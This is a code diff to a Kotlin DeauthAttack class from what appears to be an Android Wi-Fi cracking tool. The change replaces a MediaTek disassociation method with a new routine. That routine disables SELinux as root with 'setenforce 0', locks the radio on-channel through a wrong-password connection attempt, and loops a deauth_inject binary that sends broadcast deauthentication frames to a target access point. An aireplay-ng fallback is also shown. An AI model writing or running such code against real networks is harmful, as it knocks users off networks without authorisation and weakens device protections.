@@ -23,22 +23,29 @@ class DeauthAttack @Inject constructor(
         val chipInfo = chipsetMonitorHelper.detectChipVendor()
 
         if (chipInfo.vendor == WifiChipVendor.MEDIATEK && chipInfo.patchInstalled) {
-            // MTK patched driver v3: use AP_STA_DISASSOC (internal deauth via firmware TX)
-            emit("[*] Using MTK internal deauth on ${attack.targetBssid}")
-            emit("[*] Sending deauth via AP_STA_DISASSOC...")
+            // MTK patched driver: connection-based deauth
+            // Connect with wrong password to lock on-channel, then deauth via nl80211
+            val dir = "/data/local/tmp/wificracker"
+            emit("[*] MTK deauth on ${attack.targetSsid} (${attack.targetBssid})")
+            shellExecutor.executeAsRoot("setenforce 0")
 
             var count = 0
             while (count < 50) {
-                val result = shellExecutor.executeAsRoot(
-                    "/data/local/tmp/wpa_driver \"AP_STA_DISASSOC Mac=${attack.targetBssid}\""
-                )
-                count++
+                // Lock on channel via connection attempt (every 10 rounds)
+                if (count % 10 == 0) {
+                    emit("[*] Locking on-channel via connection attempt...")
+                    shellExecutor.executeAsRoot("cmd wifi connect-network \"${attack.targetSsid}\" wpa2 \"deauth_${count}\" 2>/dev/null")
+                    delay(3000)
+                }
+                // Deauth via nl80211 CMD_FRAME (works during offchannel window)
+                shellExecutor.executeAsRoot("$dir/deauth_inject wlan0 ${attack.targetBssid} ff:ff:ff:ff:ff:ff 5 2452 2>/dev/null")
+                count += 5
                 if (count % 10 == 0) {
                     emit("[*] Sent $count deauth frames to ${attack.targetBssid}")
                 }
-                delay(100) // 100ms between deauths
+                delay(200)
             }
-            emit("[+] Deauth attack completed: $count frames sent to ${attack.targetBssid}")
+            emit("[+] Deauth attack completed: $count frames sent")
         } else {
             // Standard: aireplay-ng (requires monitor mode + USB adapter)
             val binary = binaryInstaller.getBinaryPath("aireplay-ng")
